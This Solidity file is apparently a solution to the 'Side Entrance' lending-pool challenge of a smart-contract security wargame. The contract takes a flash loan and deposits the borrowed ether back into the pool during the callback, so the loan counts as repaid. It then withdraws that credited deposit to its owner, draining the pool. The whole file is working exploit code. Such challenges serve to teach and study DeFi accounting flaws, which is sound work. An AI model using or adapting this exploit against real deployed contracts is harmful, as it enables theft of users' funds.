// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

import "./SideEntranceLenderPool.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    using Address for address payable;

    address private immutable pool;
    address private owner;

    constructor(address poolAddress) {
        pool = poolAddress;
        owner = msg.sender;
    }

    function execute() override external payable {
        ISideEntranceLenderPool(pool).deposit{value: msg.value}();
    }

    function retrieveFunds() public {
        require(msg.sender == owner, "retrieveFunds() only callable by owner");
        ISideEntranceLenderPool(pool).withdraw();
        payable(owner).sendValue(address(this).balance);
    }

    function triggerFlashLoan(uint256 amount) public {
        require(msg.sender == owner, "triggerFlashLoan() only callable by owner");
        ISideEntranceLenderPool(pool).flashLoan(amount);
    }

    receive () external payable {}
}
